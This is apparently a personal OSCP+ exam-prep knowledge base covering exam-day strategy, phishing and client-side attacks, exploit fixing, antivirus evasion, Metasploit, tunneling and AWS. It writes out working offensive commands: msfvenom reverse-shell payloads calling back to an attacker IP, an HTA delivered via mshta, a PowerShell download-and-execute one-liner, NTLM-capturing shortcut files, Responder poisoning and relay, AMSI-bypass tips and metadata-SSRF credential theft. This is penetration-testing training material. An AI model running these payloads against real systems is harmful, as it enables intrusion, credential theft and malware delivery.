# OSCP+ KNOWLEDGE BASE — VOLUME 7
## SYLLABUS COMPLETION + EXAM-DAY FLOW + BEGINNER PATH
### Client-Side & Phishing · Fixing Exploits · AV Evasion · Metasploit · DPI Tunneling · Cloud (course-only) · Exam-Day Flow · Syllabus Map

> This volume closes the remaining PEN-200 syllabus modules and adds the wrapper that ties all volumes together. Exam-relevance is labelled honestly so a beginner knows where to spend time.
> `$IP`=your Kali VPN IP (tun0). `$T`=target.

---

# [BEGINNER-START-HERE]  (you are new — read this first)

**The exam is 80% enumeration + decision-making, not exploit memorization.** Your job is to build reflexes on machines, using this KB as the "what do I check next" copilot.

**Learning order (map PEN-200 modules → what to actually DO):**
1. **Get comfortable:** Kali, bash, `nmap`, `curl`, file transfer (`[FILETRANSFER-QUICK]`), shells (`[SHELL-QUICK]`). Drill until automatic.
2. **Enumeration reflexes** (Vol 1): run the `[NMAP-QUICK]` two-step + per-service `[ENUM-*]` on 10+ easy boxes.
3. **Web + SQLi** (Vol 2): the most common foothold. Practice `[WEB-QUICK]` → `[WEB-LFI]`/`[WEB-UPLOAD]`/`[SQLI]`.
4. **Foothold + exploits** (Vol 3): `[FOOTHOLD-CHECKLIST]`, `[EXPLOIT-RESEARCH]`, `[FIXING-EXPLOITS]`.
5. **Privilege escalation** (Vol 4): Linux + Windows. Top ~15 vectors each cover most boxes.
6. **Pivoting** (Vol 5): `[PIVOT-QUICK]` with Ligolo/Chisel until boring.
7. **Active Directory** (Vol 5): **the 40-point core.** Practice full chains, not single boxes.
8. **Client-side, AV, Metasploit, Cloud** (this volume): lighter — know them, don't over-invest (see relevance labels).

**Then just do boxes** (Proving Grounds Practice, HTB TJ-Null OSCP-like list, OffSec Challenge Labs), taking notes as if reporting. Target ~40–60 boxes, AD-weighted. Read a writeup only *after* you try — the gap between your notes and the writeup is your study list.

---

# [EXAM-DAY-FLOW]  ⭐ the master wrapper (open this first on exam day)

**One-line model:** *Scan everything → AD set first (BloodHound + roasts + spray → path to DC) → standalones on the 30-min rotation → spray every cred everywhere → screenshot proof the instant you get it → stop early to lock down proofs → write the report.*

> ⚠️ **No Buffer Overflow box exists in OSCP+.** Old guides say "start with the 25-pt BOF" — ignore that. Center of gravity = the **AD set (40 pts, all-or-nothing)**.

### PHASE 0 — Setup (day before + first 10 min)
- Day before: test VPN/VM/screenshots/notes; pin `OSCP-KB.html`; pre-make folders:
  `mkdir -p ~/oscp/{AD1,AD2,AD3,ST-A,ST-B,ST-C}/{scans,loot,exploits,www}`
- Start a terminal logger for the report: `script -q ~/oscp/session-$(date +%F).log`
- First 10 min (clock running): connect proctor+VPN, confirm target reachability, **read the control-panel brief** (starting creds, hostnames, domain, which are AD vs standalone) → paste into notes. Open `[MASTER-METHODOLOGY]` + `[TIME-MANAGEMENT]`.

### PHASE 1 — Fire all scans in parallel (first ~20–30 min) → `[NMAP-QUICK]`
- Launch `nmap -p- --min-rate 2000 -Pn` on **every** target at once (separate tabs). Then `-sCV` on the ports that return. Backgrounded `-sU --top-ports 100` on each.
- While scans run, start web enum on any host already showing 80/443. Route each open port via `[ENUM-DECISION]`.
- Rule: **enumerate all ports + all web before exploiting anything.**

### PHASE 2 — AD set FIRST (fresh brain, ~hrs 0.5–8) → `[AD-QUICK]`, `[AD-ATTACK-PATH]`
1. Foothold the entry host (web/service/provided cred) → stabilize (`[SHELL-QUICK]`).
2. Local loot (`[CREDENTIALS-SOURCES]`, `[WINDOWS-PRIVESC-QUICK]`).
3. First domain cred → `sudo ntpdate $DC` → **BloodHound** (`[AD-BLOODHOUND]`) → **Kerberoast** (`[AD-KERBEROAST]`) + **AS-REP** (`[AD-ASREP]`) → **spray everywhere** (`[CREDENTIALS-QUICK]`).
4. Follow BloodHound's shortest path: crack roast / abuse ACL (`[AD-ACL]`) → lateral (`[AD-LATERAL]`) → dump creds on each host → repeat.
5. Own DC → `[AD-DCSYNC]` (`secretsdump`) → PtH Administrator to DC + member + workstation → read all `proof.txt`.
- Decision: AD dead-stalled at ~3–4h with zero progress → bank a standalone, return fresh.

### PHASE 3 — Standalones, rotate (~hrs 8–16) → `[MASTER-METHODOLOGY]`
Per box: service triage (`[ENUM-DECISION]`) → foothold (`[FOOTHOLD-CHECKLIST]`) → **screenshot `local.txt` now** → privesc (`[LINUX-PRIVESC-QUICK]`/`[WINDOWS-PRIVESC-QUICK]`) → **screenshot `proof.txt` now**.
- **15-min rule:** stuck → re-read scan output. **30-min rule:** no new hypothesis → switch box, note where you stopped. New cred → spray on all boxes.
- Stuck → `[STUCK-PROTOCOL]`. Broken → `[TROUBLESHOOTING-QUICK]`. Weird box → revert (free).

### PHASE 4 — Sleep + mop-up (~hrs 10–20)
Sleep ~4–6h (fatigue = tunnel vision). Then re-attack stuck boxes fresh, grab remaining low-priv 10-pointers.
- Passing math: AD 40 + two full standalones 40 = 80 ✅. Or AD 40 + one full 20 + two low-priv 20 = 80 ✅.

### PHASE 5 — Proof lockdown (STOP hacking ~hrs 20–23) → `[REPORTING-CHECKLIST]`
Every owned host: one screenshot with **flag + `whoami`/`id` + `ip a`/`ipconfig`**. Re-take any missing **now**. Enter every flag in the control panel.

### PHASE 6 — Report (next 24h) → `[REPORTING]`
Per host reproducible steps + screenshots + proof. AD: show the full chain + cred flow. Upload in OffSec's format before deadline. **No report = no pass.**

---

# [CLIENTSIDE] Client-Side Attacks & [PHISHING] Phishing  (Modules 11–12)
**EXAM RELEVANCE:** ⚠️ *Low–moderate.* The exam usually gives you a starting foothold rather than requiring you to phish a live human. **Recognize these; don't over-drill.** Some AD entry hosts simulate a user who "opens" a file — that's where these matter. `[GENERAL]`

## [CLIENTSIDE-CONCEPT]
Client-side = you deliver a file/link and a **user action** triggers code on *their* machine (not a server exploit). PEN-200 focuses on: **capturing NTLM hashes**, **malicious Office macros**, **HTA applications**, and **Windows Library + WebDAV**.

## [CLIENTSIDE-NTLM-CAPTURE]  (highest value — feeds AD roasting/relay)
Make a victim's machine authenticate to **you**, capture the NetNTLMv2 hash → crack or relay.
> ⛔ **EXAM CAVEAT (`[EXAM-RULES-2026]`):** Responder **poisoning** (LLMNR/NBNS/WPAD, the `-w` flag) is **BANNED**. On the exam use **analyze mode** (`responder -A -I tun0`) or just host an SMB server (`impacket-smbserver`) — capturing a hash because a file the victim opens authenticates *to your server* is allowed; actively poisoning name resolution is not.
```
# Start a capture server on Kali (LAB/practice — see exam caveat above):
sudo responder -I tun0                       # listens LLMNR/NBNS/SMB/HTTP (poisoning = lab only)
sudo responder -A -I tun0                     # ANALYZE mode (passive) = exam-compliant
# Deliver a file/link that forces an SMB/WebDAV auth to your IP, e.g.:
#  - a share/upload with a malicious .scf / .url / .lnk pointing to \\$IP\x
#  - an email/web link:  file://$IP/x   or   \\$IP\share
# Captured hash → crack:
hashcat -m 5600 netntlmv2.txt rockyou.txt
```
`.url` example dropped in a writable share (target browses the folder → auth to you):
```
[InternetShortcut]
URL=file://$IP/x
IconIndex=1
IconFile=\\$IP\x\icon.ico
```
**LEADS TO:** NetNTLMv2 → crack → domain creds; or **NTLM relay** (`ntlmrelayx` to a signing:False host) → command exec. See `[SMB-ATTACK]`, `[AD-CREDENTIALS]`.

## [CLIENTSIDE-MACRO]  malicious Office macro (VBA)
When a target is expected to open a document (rare on exam):
```
# msfvenom can generate VBA:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=443 -f vba
```
Paste into the document's VBA editor (Auto_Open/Document_Open sub). A common OSCP-style VBA drops+runs a payload via PowerShell. Host payload with `python3 -m http.server`; catch with a listener.

## [CLIENTSIDE-HTA]  HTML Application
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=443 -f hta-psh -o evil.hta
# victim runs:  mshta http://$IP/evil.hta
```

## [CLIENTSIDE-LIBRARY-WEBDAV]  Windows Library + WebDAV (PEN-200 technique)
Host a WebDAV share (`wsgidav`/`impacket`), craft a `.Library-ms` + shortcut that points at your WebDAV, deliver it; when opened it lists your share and runs your payload. `[LOOK-UP]` (uncommon on exam — recognize only).
**TROUBLESHOOT:** payload caught by AV → see `[AV-EVASION]`; hash not cracking → try relay instead.

---

# [FIXING-EXPLOITS]  (Module 14 — expands `[EXPLOIT-RESEARCH]`)
**EXAM RELEVANCE:** ✅ *Moderate–high.* You WILL need to compile/patch a public exploit. `[GENERAL]`

## [FIXING-COMPILE]  compiling exploits
```
# Linux C exploit:
gcc exploit.c -o exploit                 # add -m32 for 32-bit, -static if libc mismatch
# Windows exe from Kali (cross-compile with mingw):
sudo apt install -y mingw-w64                           # if the compilers below are missing (usually preinstalled)
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe        # 64-bit
i686-w64-mingw32-gcc  exploit.c -o exploit.exe         # 32-bit
# 32-bit LINUX exploit on 64-bit Kali needs multilib:  sudo apt install gcc-multilib  →  gcc -m32 exploit.c -o exploit
# Windows privesc PoCs often need Visual Studio — check for a precompiled release on the repo first.
```

## [FIXING-PYTHON]  Python 2 → 3 breakage
- `print x` → `print(x)`. `urllib2` → `urllib.request`. `socket.send("x")` → `.send(b"x")` (bytes).
- Run with the intended interpreter: `python2 exploit.py` (install if needed) vs `python3`.

## [FIXING-BADCHARS-SHELLCODE]  patch the payload
- **Bad characters:** many exploits mangle if shellcode contains `\x00 \x0a \x0d` etc. Regenerate excluding them:
  `msfvenom -p ... -b '\x00\x0a\x0d' -f c LHOST=$IP LPORT=443`
- **Replace hardcoded values:** set the exploit's `LHOST`/`LPORT`/`RHOST`, target IP, and any offset/return address to match your case.
- **Regenerate embedded shellcode:** produce new shellcode with msfvenom in the format the PoC expects (`-f python/c/ps1`), paste it in, keep the variable name/length assumptions consistent.
- **Architecture:** x86 vs x64 must match the target process.

## [FIXING-CHECKLIST]  before you run anything
```
[ ] Read the whole exploit — what does it do? Any destructive/DoS action? (revert risk)
[ ] Version + arch + auth requirement match the target exactly?
[ ] LHOST=tun0 IP, LPORT set, target IP/port correct
[ ] Interpreter/deps present (python2? ruby? gcc/mingw?)
[ ] Shellcode has no bad chars; regenerated for your listener
[ ] Not malware masquerading as a PoC (unknown network calls = suspicious)
```

---

# [AV-EVASION]  Antivirus Evasion  (Module 15)
**EXAM RELEVANCE:** ⚠️ *Low for standard OSCP+ targets* (most exam boxes don't run hardened Defender that eats everything), but **Defender is sometimes on**, so know the basics. **Do not build a study plan around AV evasion.** `[GENERAL]`

## [AV-CONCEPT]
Signature + heuristic + AMSI (script scanning) can flag your payloads. Options, cheapest first:
1. **Use a different technique** — a living-off-the-land command, a webshell, or creds+`evil-winrm` avoids dropping a flagged binary entirely.
2. **Don't touch disk** — run PowerShell/C# **in memory** (download-and-exec, reflective load).
3. **Obfuscate / re-encode** the payload.
4. **Compile your own** loader (custom C#/C shellcode runner) — most reliable vs signatures.

## [AV-PRACTICAL]
- **msfvenom encoders are NOT AV evasion** anymore (e.g., `shikata_ga_nai` is well-signatured). Don't rely on `-e`/`-i`.
- **AMSI bypass** (PowerShell script blocked): use a known AMSI-bypass one-liner before your script `[LOOK-UP]`, or run via a non-PowerShell vector. Patch/obfuscate approaches exist — verify current bypass, they change.
- **In-memory PS download-exec:** `IEX (New-Object Net.WebClient).DownloadString('http://$IP/x.ps1')` (may still hit AMSI → bypass first).
- **Custom C# shellcode runner** (compile with `csc.exe` / mono) that allocates memory + runs msfvenom raw shellcode — evades static sigs far better than a raw msfvenom exe.
- **Tools:** Invoke-Obfuscation (PS), Shellter (PE injection), Veil (dated), custom loaders. `[LOOK-UP]`
**TROUBLESHOOT:** payload deletes instantly → Defender real-time; try in-memory + obfuscation, or avoid the binary (use creds/webshell). Test detection with `AMSITrigger`/local Defender if available (don't upload to VirusTotal — it distributes samples).

---

# [TOOL-MSF]  The Metasploit Framework  (Module 21)
**EXAM RELEVANCE:** ✅ but **restricted — ONE target only.** Meterpreter/exploit/post modules count against your single allowed machine; **no MSF for pivoting.** Use it deliberately on your hardest box; **do everything else manually.** `[OFFICIAL OFFSEC]`

## [MSF-QUICK]
```
msfconsole -q
search <product/cve>
use exploit/<path>
show options ; set RHOSTS $T ; set LHOST tun0 ; set LPORT 443 ; set RPORT <p>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit            # or: run
sessions -l ; sessions -i 1 ; background       # (Ctrl+Z to background a session)
```
## [MSF-HANDLER]  catch a manual payload (multi/handler)
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0 ; set LPORT 443 ; exploit -j
```
## [MSF-MSFVENOM]  payload generation (usable broadly for shells)
```
# Windows exe / Linux elf / web / raw shellcode:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=443 -f exe -o m.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f elf -o r.elf
msfvenom -p php/reverse_php LHOST=$IP LPORT=443 -f raw -o sh.php
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f exe -o r.exe   # non-meterpreter stager (no MSF session needed to catch — use nc)
```
## [MSF-METERPRETER]  common commands
`getuid`, `sysinfo`, `ps`, `migrate <pid>`, `hashdump`, `getsystem` (token), `upload/download`, `shell`, `background`, `run post/multi/recon/local_exploit_suggester` (privesc leads).
**RULE:** pick your ONE MSF box (often the hardest/most finicky exploit). Everywhere else: manual exploit + `nc`/manual shells (`[SHELL-QUICK]`). Never MSF-pivot on the exam.

---

# [DPI-TUNNELING]  Tunneling Through Deep Packet Inspection  (Module 20 — extends `[PIVOT-*]`)
**EXAM RELEVANCE:** ⚠️ *Low–moderate.* Standard pivoting (`[PIVOT-QUICK]` Ligolo/Chisel/SSH) covers almost everything. This is for when normal ports/protocols are **filtered by a firewall/proxy**. `[GENERAL]`
- **Chisel over HTTP/TLS**: chisel already looks like HTTP(S); use common egress ports (80/443) if raw ports are blocked.
- **DNS tunneling (dnscat2 / iodine):** when *only* DNS (53) leaves the network. Slow, last resort.
  `# server: dnscat2-server tunnel.domain ; client: ./dnscat2 tunnel.domain` `[LOOK-UP]`
- **SSH over 443 / proxy:** if only 443 egress → run SSH/chisel on 443; behind an HTTP proxy use `proxytunnel`/`corkscrew`.
- **Decision:** try Ligolo/Chisel on 443 first; only reach for DNS tunneling if everything else is filtered.

---

# [CLOUD-AWS]  AWS Cloud (Modules 25–26, 29–31)
**EXAM RELEVANCE:** 🚫 **NOT on the standard OSCP/OSCP+ exam.** The exam is 3 standalones + 1 AD set. Cloud is **course/"Extra Mile" content only** — good general knowledge, but **do not spend exam prep here.** Skim it, move on. `[OFFICIAL OFFSEC]` (exam guide format) + `[COMMUNITY]`

## [CLOUD-AWS-QUICK]  (awareness level)
```
aws configure                              # set found access key/secret/region
aws sts get-caller-identity                # who am I (identity/account)
aws s3 ls ; aws s3 ls s3://<bucket> --no-sign-request     # public bucket loot
aws iam list-users ; aws iam list-attached-user-policies --user-name X
aws ec2 describe-instances                 # find hosts/user-data (may hold secrets)
aws secretsmanager list-secrets ; aws ssm get-parameters ...
```
- **Metadata SSRF (this CAN appear via a web `[WEB-SSRF]` finding):** `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → temporary AWS creds. This overlaps normal web exploitation — worth recognizing.
- Loot to hunt: S3 buckets (public/misconfigured), IAM over-permissive policies, EC2 user-data scripts, Secrets Manager/SSM parameters.
**Bottom line for a beginner:** learn the metadata-SSRF idea (it's a web trick); skip deep AWS attack chains until after you pass.

---

# [SYLLABUS-MAP]  PEN-200 module → KB coverage (full)
```
1-6  Intro/Kali/CLI/Bash/Report/Info-Gathering → [BEGINNER-START-HERE], Vol1 [ENUM-*], Vol0 [REPORTING]
7    Vulnerability Scanning        → [NMAP-SCRIPTS] [METHOD-7] (nikto); Nessus not needed for exam
8    Intro Web App Attacks         → Vol2 [WEB-QUICK] [WEB-FINGERPRINT] [WEB-CONTENT]
9    Common Web App Attacks        → Vol2 [WEB-*] (LFI/RFI/CMDINJ/SSRF/SSTI/XXE/UPLOAD/IDOR/JWT/AUTHBYPASS)
10   SQL Injection Attacks         → Vol2 [SQLI-*] (mini-course, all DBs + sqlmap)
11   Phishing Basics               → Vol7 [PHISHING] [CLIENTSIDE-NTLM-CAPTURE]
12   Client-side Attacks           → Vol7 [CLIENTSIDE-*] (NTLM capture / macro / HTA / library)
13   Locating Public Exploits      → Vol3 [EXPLOIT-RESEARCH]
14   Fixing Exploits               → Vol7 [FIXING-EXPLOITS] (+ Vol3 [EXPLOIT-RESEARCH])
15   Antivirus Evasion             → Vol7 [AV-EVASION]
16   Password Attacks              → Vol3 [CREDENTIALS-*] [HASH-IDENTIFICATION] (hydra/hashcat/john)
17   Windows Privilege Escalation  → Vol4 [WINDOWS-PRIVESC-*]
18   Linux Privilege Escalation    → Vol4 [LINUX-PRIVESC-*]
19   Port Redirection & SSH Tunnel → Vol5 [PIVOT-SSH] [PIVOT-QUICK]
20   Tunneling Through DPI         → Vol7 [DPI-TUNNELING] (+ Vol5 [PIVOT-*])
21   The Metasploit Framework      → Vol7 [TOOL-MSF] (one-target rule)
22   AD Introduction & Enumeration → Vol5 [AD-ENUM] [AD-QUICK] [AD-BLOODHOUND]
23   Attacking AD Authentication   → Vol5 [AD-KERBEROAST] [AD-ASREP] [AD-CREDENTIALS]
24   Lateral Movement in AD        → Vol5 [AD-LATERAL] [AD-ACL] [AD-DCSYNC]
25-26 AWS Cloud Enum/Attack        → Vol7 [CLOUD-AWS]  (NOT on exam — awareness only)
27   Assembling the Pieces         → Vol5 [AD-ATTACK-PATH], Vol6 [CHAIN-*], Vol7 [EXAM-DAY-FLOW]
28   Trying Harder: Challenge Labs → Vol0 [MINIMUM-VIABLE-PREP], [BEGINNER-START-HERE]
29-31 Extra Mile: Cloud Labs       → Vol7 [CLOUD-AWS] (NOT on exam)
```
**Everything in the syllabus is now covered.** Exam-critical (spend your time here): **8–10 (web/SQLi), 13–14 & 16 (exploits/passwords), 17–19 (privesc/pivot), 22–24 (AD), 27 (assembling).** Light-touch: 11–12, 15, 20, 21. Skip-for-exam: 25–26, 29–31 (cloud).

---
*End Volume 7. This completes the PEN-200 syllabus coverage.*
